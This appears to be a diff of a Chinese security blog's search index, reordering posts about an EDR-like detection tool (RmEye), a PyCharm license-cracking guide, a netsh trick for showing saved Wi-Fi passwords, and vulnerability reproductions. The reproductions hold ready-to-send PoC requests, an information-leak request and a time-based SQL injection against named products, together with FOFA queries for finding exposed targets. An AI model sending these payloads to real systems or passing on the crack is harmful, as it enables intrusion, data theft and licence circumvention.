@@ -1,116 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>RmEye-戎码之眼</title>
-    <url>/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</url>
-    <content><![CDATA[<h1 id="rmeye"><a class="markdownIt-Anchor" href="#rmeye">#</a> RmEye</h1>
-<p>RmEye 是一个 window 上的基于 att&amp;ck 现代 EDR 设计思想的威胁响应工具。不同于 EDR, 它轻量、高效。自身定位是轻量级威胁检出工具。而不是繁重的、需要付费的、效果不明的所谓的 EDR</p>
-<h2 id="功能特点"><a class="markdownIt-Anchor" href="#功能特点">#</a> 功能特点</h2>
-<ul>
-<li>基于 att&amp;ck 设计。所有设计只是为了符合 att&amp;ck 的攻击路径、攻击链 (虽然规则里面没有标注 T 因为懒惰)</li>
-<li>轻量、高效。为了不适用繁重超占内存的 ELK 设计思路，而且要保证检出的同时保证不会太重，agent 端使用了大量规则过滤，这样才使得后端使用 sqlite 作为数据库成为可能。单机日志平均一天 4M. 此外轻量级别的客户端一天只占 40-400KB 的内存.</li>
-<li>行为检出，让免杀成为过去式。基于 att&amp;ck 设计，只看行为不看文件。文件类免杀已经成为过去式.</li>
-<li>高扩展性。可随需求定制功能</li>
-</ul>
-<h2 id="rmeye-之所以不是-edrxdrmdrndrxxxxxdr"><a class="markdownIt-Anchor" href="#rmeye-之所以不是-edrxdrmdrndrxxxxxdr">#</a> RmEye 之所以不是 Edr/Xdr/Mdr/Ndr/XXXXXdr</h2>
-<ul>
-<li>RmEye 没有流量监控</li>
-<li>RmEye 仅覆盖 20% 左右的 datasource</li>
-<li>RmEye 没有联动 WAF、IPS/IDS</li>
-<li>RmEye 没有实时拦截功能</li>
-<li>对 RPC、COM、ALPC 基本无能为力</li>
-<li>不支持更高级的扩展检测，如检测脚本、下发规则，主机链</li>
-<li>受限于 Sysmon, 很多 att&amp;ck 的 T 没有覆盖，也无法覆盖.</li>
-<li>没有响应能力，只能被动记录。请牢记，RmEye 自身定位是轻量级威胁检出工具</li>
-<li>github 链接：<a href="https://github.com/RoomaSec/RmEye">https://github.com/RoomaSec/RmEye</a></li>
-</ul>
-<h2 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h2>
-<ul>
-<li>运行客户端<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194255.png" alt="20241105194255"><br>
- 下载 release ( <a href="https://github.com/RoomaSec/RmEye/releases">https://github.com/RoomaSec/RmEye/releases</a> ), 里面有客户端，服务端自行 clone 本项目<br>
-服务端是 python3 编写，安装完依赖库后输入</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python webserver.py</span><br></pre></td></tr></table></figure>
-<p>即可部署<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194408.png" alt="20241105194408"><br>
- 服务端部署后，修改 config.py 里面的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检出阈值,越高越难检出但是也会越准确  </span><br><span class="line">MAX_THREAT_SCORE = 170</span><br><span class="line"></span><br><span class="line"># 授权访问主站的IP列表.如果不在后台里面则不能访问后台  </span><br><span class="line">ALLOW_ACCESS_IP = [&#x27;127.0.0.1&#x27;]</span><br></pre></td></tr></table></figure>
-<p>MAX_THREAT_SCORE 代表报警分数，意思为进程链总分超过此分数则报警，越高越准但是也会漏报 ALLOW_ACCESS_IP 代表允许的 IP, 只有在此名单里面的 IP 才能访问后台。请增加自己的 IP 地址<br>
-客户端则编辑 config.ini</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[communication]</span><br><span class="line">server = http://192.168.111.189:5000</span><br></pre></td></tr></table></figure>
-<p>其中 server 改成你的服务端的地址<br>
-然后分发三个文件给客户端并且放在同一目录:<br>
-config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
- 之后管理员身份运行 install.cmd 安装 sysmon 与 RmEye<br>
- 访问 <a href="http://xn--ip-fr5c86lx7z:5000">http:// 服务器 ip:5000</a> (flask 默认端口) 查看后台<br>
-当然一开始啥数据也没有，为了确认是否安装成功可以将 webserver.py 中的</p>
-<h2 id="检出截图"><a class="markdownIt-Anchor" href="#检出截图">#</a> 检出截图</h2>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194549.png" alt="20241105194549"><br>
- 威胁列表<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194613.png" alt="20241105194613"><br>
- 详细进程<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194641.png" alt="20241105194641"></p>
-<h2 id="卸载"><a class="markdownIt-Anchor" href="#卸载">#</a> 卸载</h2>
-<p>卸载 RmEye: 在 RmEye 目录下执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SysEye /uninstall</span><br></pre></td></tr></table></figure>
-<p>如果您需要卸载 sysmon 执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon /uninstall</span><br></pre></td></tr></table></figure>
-<p>即可干净卫生的卸载掉 RmEye</p>
-<h2 id="ioc"><a class="markdownIt-Anchor" href="#ioc">#</a> IOC</h2>
-<p>目前 RmEye 使用的是<a href="https://metadefender.opswat.com/%E7%9A%84%E5%85%8D%E8%B4%B9IOC,%E7%9B%AE%E5%89%8D%E7%9A%84apikey%E4%BB%85%E7%94%A8%E4%BA%8E%E6%B5%8B%E8%AF%95,%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E8%AF%B7%E5%8A%A1%E5%BF%85%E6%89%93%E5%BC%80plugins/ioc_opswat/opswat.py%E6%8A%8A%22apikey%22:"> https://metadefender.opswat.com/ 的免费 IOC, 目前的 apikey 仅用于测试，自己部署的时候请务必打开 plugins/ioc_opswat/opswat.py 把 &quot;apikey&quot;:</a> &quot;010d4868aef799750e2828fdf17a4d98&quot; 换成你自己的，否做会不安全 (比如其他人能查得到你的请求记录)/ 有使用量限制 (100 次一天). 所以务必换成你自己注册的账号。这个 IOC 源是免费的而且好用的，比 OTX 好用</p>
-<h2 id="第三方引用库"><a class="markdownIt-Anchor" href="#第三方引用库">#</a> 第三方引用库</h2>
-<p>1、sysmon <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon</a><br>
-2、rule_engine <a href="https://github.com/zeroSteiner/rule-engine">https://github.com/zeroSteiner/rule-engine</a><br>
-3、yara <a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a><br>
-4、sysmon-config (客户端使用的默认的规则，但是我做了一些修改) <a href="https://github.com/SwiftOnSecurity/sysmon-config">https://github.com/SwiftOnSecurity/sysmon-config</a><br>
- 请遵守相关库的开源协议。相关法律风险本项目不负任何责任</p>
-]]></content>
-      <tags>
-        <tag>神兵利器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pycharmd等永久激活</title>
-    <url>/2024/11/10/Pycharmd%E7%AD%89%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
-    <content><![CDATA[<h1 id="win版本支持20212-2024"><a class="markdownIt-Anchor" href="#win版本支持20212-2024">#</a> win 版本支持 2021.2-2024</h1>
-<p>文章来自：<a href="https://shimo.im/docs/5xkGoDX7eRHRW9kX/read">https://shimo.im/docs/5xkGoDX7eRHRW9kX/read</a></p>
-<h2 id="下载压缩包"><a class="markdownIt-Anchor" href="#下载压缩包">#</a> 下载压缩包</h2>
-<pre><code>https://pan.baidu.com/s/1bENAlp5e0lSyAzuoKrjZoA
-密码为：abcd
-</code></pre>
-<h2 id="解压"><a class="markdownIt-Anchor" href="#解压">#</a> 解压</h2>
-<p>解压后放到目录，比如 D 盘不要放下载目录，不要放桌面）<br>
-注意激活成功后文件不要删除，不要改名，不要移动，路径文件夹不能有中文和中文符号（包含上级）<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231650.png" alt="20241110231650"><br>
- 打开解压的文件夹<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231751.png" alt="20241110231751"><br>
- 打开 scripts 文件夹<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231809.png" alt="20241110231809"><br>
- 运行 install 脚本（需要激活的软件必须关了）<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231834.png" alt="20241110231834"><br>
- 若有弹窗则点是，无则忽略<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231931.png" alt="20241110231931"><br>
- 点击确认<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231944.png" alt="20241110231944"><br>
- 等待 5 分钟弹出 success<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231957.png" alt="20241110231957"><br>
- 目录下 的 Activation_Code 找到与你需要激活软件相同名字的文本全选复制<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232017.png" alt="20241110232017"><br>
- 对应的应用图<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232031.png" alt="20241110232031"><br>
- 激活<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232045.png" alt="20241110232045"><br>
- 点击 continue 或 close 则激活成功<br>
-此方法激活少部分软件显示 2025 到期，实际永久不掉，放心使用<br>
-若显示 Key is invalid Help 激活无效 (如下图)，重启电脑在填入激活码<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232113.png" alt="20241110232113"></p>
-]]></content>
-      <tags>
-        <tag>神兵利器</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VMware ESXi CVE-2024-37085漏洞验证分析</title>
     <url>/2024/10/28/VMware%20ESXi%20CVE-2024-37085/</url>
     <content><![CDATA[<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b906bb43fbf2b211b9e52d27c78065380dd78e4b.jpg" alt="device"></p>
@@ -313,6 +203,76 @@ config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
       </tags>
   </entry>
   <entry>
+    <title>RmEye-戎码之眼</title>
+    <url>/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</url>
+    <content><![CDATA[<h1 id="rmeye"><a class="markdownIt-Anchor" href="#rmeye">#</a> RmEye</h1>
+<p>RmEye 是一个 window 上的基于 att&amp;ck 现代 EDR 设计思想的威胁响应工具。不同于 EDR, 它轻量、高效。自身定位是轻量级威胁检出工具。而不是繁重的、需要付费的、效果不明的所谓的 EDR</p>
+<h2 id="功能特点"><a class="markdownIt-Anchor" href="#功能特点">#</a> 功能特点</h2>
+<ul>
+<li>基于 att&amp;ck 设计。所有设计只是为了符合 att&amp;ck 的攻击路径、攻击链 (虽然规则里面没有标注 T 因为懒惰)</li>
+<li>轻量、高效。为了不适用繁重超占内存的 ELK 设计思路，而且要保证检出的同时保证不会太重，agent 端使用了大量规则过滤，这样才使得后端使用 sqlite 作为数据库成为可能。单机日志平均一天 4M. 此外轻量级别的客户端一天只占 40-400KB 的内存.</li>
+<li>行为检出，让免杀成为过去式。基于 att&amp;ck 设计，只看行为不看文件。文件类免杀已经成为过去式.</li>
+<li>高扩展性。可随需求定制功能</li>
+</ul>
+<h2 id="rmeye-之所以不是-edrxdrmdrndrxxxxxdr"><a class="markdownIt-Anchor" href="#rmeye-之所以不是-edrxdrmdrndrxxxxxdr">#</a> RmEye 之所以不是 Edr/Xdr/Mdr/Ndr/XXXXXdr</h2>
+<ul>
+<li>RmEye 没有流量监控</li>
+<li>RmEye 仅覆盖 20% 左右的 datasource</li>
+<li>RmEye 没有联动 WAF、IPS/IDS</li>
+<li>RmEye 没有实时拦截功能</li>
+<li>对 RPC、COM、ALPC 基本无能为力</li>
+<li>不支持更高级的扩展检测，如检测脚本、下发规则，主机链</li>
+<li>受限于 Sysmon, 很多 att&amp;ck 的 T 没有覆盖，也无法覆盖.</li>
+<li>没有响应能力，只能被动记录。请牢记，RmEye 自身定位是轻量级威胁检出工具</li>
+<li>github 链接：<a href="https://github.com/RoomaSec/RmEye">https://github.com/RoomaSec/RmEye</a></li>
+</ul>
+<h2 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h2>
+<ul>
+<li>运行客户端<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194255.png" alt="20241105194255"><br>
+ 下载 release ( <a href="https://github.com/RoomaSec/RmEye/releases">https://github.com/RoomaSec/RmEye/releases</a> ), 里面有客户端，服务端自行 clone 本项目<br>
+服务端是 python3 编写，安装完依赖库后输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python webserver.py</span><br></pre></td></tr></table></figure>
+<p>即可部署<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194408.png" alt="20241105194408"><br>
+ 服务端部署后，修改 config.py 里面的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检出阈值,越高越难检出但是也会越准确  </span><br><span class="line">MAX_THREAT_SCORE = 170</span><br><span class="line"></span><br><span class="line"># 授权访问主站的IP列表.如果不在后台里面则不能访问后台  </span><br><span class="line">ALLOW_ACCESS_IP = [&#x27;127.0.0.1&#x27;]</span><br></pre></td></tr></table></figure>
+<p>MAX_THREAT_SCORE 代表报警分数，意思为进程链总分超过此分数则报警，越高越准但是也会漏报 ALLOW_ACCESS_IP 代表允许的 IP, 只有在此名单里面的 IP 才能访问后台。请增加自己的 IP 地址<br>
+客户端则编辑 config.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[communication]</span><br><span class="line">server = http://192.168.111.189:5000</span><br></pre></td></tr></table></figure>
+<p>其中 server 改成你的服务端的地址<br>
+然后分发三个文件给客户端并且放在同一目录:<br>
+config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
+ 之后管理员身份运行 install.cmd 安装 sysmon 与 RmEye<br>
+ 访问 <a href="http://xn--ip-fr5c86lx7z:5000">http:// 服务器 ip:5000</a> (flask 默认端口) 查看后台<br>
+当然一开始啥数据也没有，为了确认是否安装成功可以将 webserver.py 中的</p>
+<h2 id="检出截图"><a class="markdownIt-Anchor" href="#检出截图">#</a> 检出截图</h2>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194549.png" alt="20241105194549"><br>
+ 威胁列表<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194613.png" alt="20241105194613"><br>
+ 详细进程<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194641.png" alt="20241105194641"></p>
+<h2 id="卸载"><a class="markdownIt-Anchor" href="#卸载">#</a> 卸载</h2>
+<p>卸载 RmEye: 在 RmEye 目录下执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SysEye /uninstall</span><br></pre></td></tr></table></figure>
+<p>如果您需要卸载 sysmon 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon /uninstall</span><br></pre></td></tr></table></figure>
+<p>即可干净卫生的卸载掉 RmEye</p>
+<h2 id="ioc"><a class="markdownIt-Anchor" href="#ioc">#</a> IOC</h2>
+<p>目前 RmEye 使用的是<a href="https://metadefender.opswat.com/%E7%9A%84%E5%85%8D%E8%B4%B9IOC,%E7%9B%AE%E5%89%8D%E7%9A%84apikey%E4%BB%85%E7%94%A8%E4%BA%8E%E6%B5%8B%E8%AF%95,%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E8%AF%B7%E5%8A%A1%E5%BF%85%E6%89%93%E5%BC%80plugins/ioc_opswat/opswat.py%E6%8A%8A%22apikey%22:"> https://metadefender.opswat.com/ 的免费 IOC, 目前的 apikey 仅用于测试，自己部署的时候请务必打开 plugins/ioc_opswat/opswat.py 把 &quot;apikey&quot;:</a> &quot;010d4868aef799750e2828fdf17a4d98&quot; 换成你自己的，否做会不安全 (比如其他人能查得到你的请求记录)/ 有使用量限制 (100 次一天). 所以务必换成你自己注册的账号。这个 IOC 源是免费的而且好用的，比 OTX 好用</p>
+<h2 id="第三方引用库"><a class="markdownIt-Anchor" href="#第三方引用库">#</a> 第三方引用库</h2>
+<p>1、sysmon <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon</a><br>
+2、rule_engine <a href="https://github.com/zeroSteiner/rule-engine">https://github.com/zeroSteiner/rule-engine</a><br>
+3、yara <a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a><br>
+4、sysmon-config (客户端使用的默认的规则，但是我做了一些修改) <a href="https://github.com/SwiftOnSecurity/sysmon-config">https://github.com/SwiftOnSecurity/sysmon-config</a><br>
+ 请遵守相关库的开源协议。相关法律风险本项目不负任何责任</p>
+]]></content>
+      <tags>
+        <tag>神兵利器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>huggingface/transformers RCE</title>
     <url>/2024/10/28/huggingfaceRCE/</url>
     <content><![CDATA[<h1 id="huggingfacetransformers-rce漏洞分析-cve-2024-3568"><a class="markdownIt-Anchor" href="#huggingfacetransformers-rce漏洞分析-cve-2024-3568">#</a> huggingface/	transformers RCE 漏洞分析 （CVE-2024-3568）</h1>
@@ -364,20 +324,43 @@ config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
       </tags>
   </entry>
   <entry>
-    <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
-    <url>/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="方正全媒体采编系统存在syndo信息泄露漏洞"><a class="markdownIt-Anchor" href="#方正全媒体采编系统存在syndo信息泄露漏洞">#</a> 方正全媒体采编系统存在 syn.do 信息泄露漏洞</h1>
-<h2 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍">#</a> 1、漏洞介绍</h2>
-<p>​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。</p>
-<h2 id="2-fofa语句"><a class="markdownIt-Anchor" href="#2-fofa语句">#</a> 2、 fofa 语句</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;FOUNDER-全媒体采编系统&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="3-poc"><a class="markdownIt-Anchor" href="#3-poc">#</a> 3、POC</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /newsedit/assess/syn.do?type=org HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Content-Length: 185Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<h2 id="4-验证"><a class="markdownIt-Anchor" href="#4-验证">#</a> 4、验证</h2>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png" alt="image.png"></p>
+    <title>Pycharmd等永久激活</title>
+    <url>/2024/11/10/Pycharmd%E7%AD%89%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
+    <content><![CDATA[<h1 id="win版本支持20212-2024"><a class="markdownIt-Anchor" href="#win版本支持20212-2024">#</a> win 版本支持 2021.2-2024</h1>
+<p>文章来自：<a href="https://shimo.im/docs/5xkGoDX7eRHRW9kX/read">https://shimo.im/docs/5xkGoDX7eRHRW9kX/read</a></p>
+<h2 id="下载压缩包"><a class="markdownIt-Anchor" href="#下载压缩包">#</a> 下载压缩包</h2>
+<pre><code>https://pan.baidu.com/s/1bENAlp5e0lSyAzuoKrjZoA
+密码为：abcd
+</code></pre>
+<h2 id="解压"><a class="markdownIt-Anchor" href="#解压">#</a> 解压</h2>
+<p>解压后放到目录，比如 D 盘不要放下载目录，不要放桌面）<br>
+注意激活成功后文件不要删除，不要改名，不要移动，路径文件夹不能有中文和中文符号（包含上级）<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231650.png" alt="20241110231650"><br>
+ 打开解压的文件夹<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231751.png" alt="20241110231751"><br>
+ 打开 scripts 文件夹<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231809.png" alt="20241110231809"><br>
+ 运行 install 脚本（需要激活的软件必须关了）<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231834.png" alt="20241110231834"><br>
+ 若有弹窗则点是，无则忽略<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231931.png" alt="20241110231931"><br>
+ 点击确认<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231944.png" alt="20241110231944"><br>
+ 等待 5 分钟弹出 success<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231957.png" alt="20241110231957"><br>
+ 目录下 的 Activation_Code 找到与你需要激活软件相同名字的文本全选复制<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232017.png" alt="20241110232017"><br>
+ 对应的应用图<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232031.png" alt="20241110232031"><br>
+ 激活<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232045.png" alt="20241110232045"><br>
+ 点击 continue 或 close 则激活成功<br>
+此方法激活少部分软件显示 2025 到期，实际永久不掉，放心使用<br>
+若显示 Key is invalid Help 激活无效 (如下图)，重启电脑在填入激活码<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232113.png" alt="20241110232113"></p>
 ]]></content>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>神兵利器</tag>
       </tags>
   </entry>
   <entry>
@@ -395,32 +378,6 @@ config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
 ]]></content>
       <tags>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>日常小工具集合</title>
-    <url>/2024/11/11/%E6%97%A5%E5%B8%B8%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</url>
-    <content><![CDATA[<h1 id="日常小工具集合"><a class="markdownIt-Anchor" href="#日常小工具集合">#</a> 日常小工具集合</h1>
-<h2 id="查询真实ip"><a class="markdownIt-Anchor" href="#查询真实ip">#</a> 查询真实 ip：</h2>
-<ul>
-<li><a href="https://search.censys.io/search?resource=hosts">https://search.censys.io/search?resource=hosts</a><br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111091858.png" alt="20241111091858"></li>
-</ul>
-<h2 id="ip提取"><a class="markdownIt-Anchor" href="#ip提取">#</a> IP 提取：</h2>
-<ul>
-<li><a href="https://potato.gold/navbar/tool/">https://potato.gold/navbar/tool/</a><br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111092147.png" alt="20241111092147"></li>
-</ul>
-<h2 id="查看wifi密码"><a class="markdownIt-Anchor" href="#查看wifi密码">#</a> 查看 wifi 密码</h2>
-<pre><code>netsh wlan show profiles
-</code></pre>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241205152751.png" alt="20241205152751"><br>
-name = 输入 wifi 名称</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles name=FL-5G-1393 key=clear</span><br></pre></td></tr></table></figure>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241205152913.png" alt="20241205152913"></p>
-]]></content>
-      <tags>
-        <tag>日常小工具</tag>
       </tags>
   </entry>
   <entry>
@@ -489,24 +446,6 @@ SHA256：ef18c975d970f42e959560ff9718d258316bce8e5295034f987cc40eddf95432</li>
       </tags>
   </entry>
   <entry>
-    <title>智慧平台SExcelExpErr.ashx存在SQL注入漏洞</title>
-    <url>/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="智慧平台sexcelexperrashx存在sql注入漏洞"><a class="markdownIt-Anchor" href="#智慧平台sexcelexperrashx存在sql注入漏洞">#</a> 智慧平台 SExcelExpErr.ashx 存在 SQL 注入漏洞</h1>
-<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h2>
-<p>智慧平台 SExcelExpErr 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据敏感信息。</p>
-<h2 id="fofa语句"><a class="markdownIt-Anchor" href="#fofa语句">#</a> fofa 语句</h2>
-<pre><code>body=&quot;custom/blue/uimaker/easyui.css&quot;
-</code></pre>
-<h2 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> POC</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ashx/KQ/SExcelExpErr.ashx?action=list&amp;importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
-<h2 id="验证"><a class="markdownIt-Anchor" href="#验证">#</a> 验证</h2>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105160450.png" alt="20241105160450"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>natpass 主机管理工具</title>
     <url>/2024/11/12/natpass/</url>
     <content><![CDATA[<h1 id="主机管理工具-natpass"><a class="markdownIt-Anchor" href="#主机管理工具-natpass">#</a> 主机管理工具 - Natpass</h1>
@@ -549,6 +488,67 @@ SHA256：ef18c975d970f42e959560ff9718d258316bce8e5295034f987cc40eddf95432</li>
 ]]></content>
       <tags>
         <tag>神兵利器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
+    <url>/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="方正全媒体采编系统存在syndo信息泄露漏洞"><a class="markdownIt-Anchor" href="#方正全媒体采编系统存在syndo信息泄露漏洞">#</a> 方正全媒体采编系统存在 syn.do 信息泄露漏洞</h1>
+<h2 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍">#</a> 1、漏洞介绍</h2>
+<p>​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。</p>
+<h2 id="2-fofa语句"><a class="markdownIt-Anchor" href="#2-fofa语句">#</a> 2、 fofa 语句</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;FOUNDER-全媒体采编系统&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="3-poc"><a class="markdownIt-Anchor" href="#3-poc">#</a> 3、POC</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /newsedit/assess/syn.do?type=org HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Content-Length: 185Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h2 id="4-验证"><a class="markdownIt-Anchor" href="#4-验证">#</a> 4、验证</h2>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png" alt="image.png"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>智慧平台SExcelExpErr.ashx存在SQL注入漏洞</title>
+    <url>/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
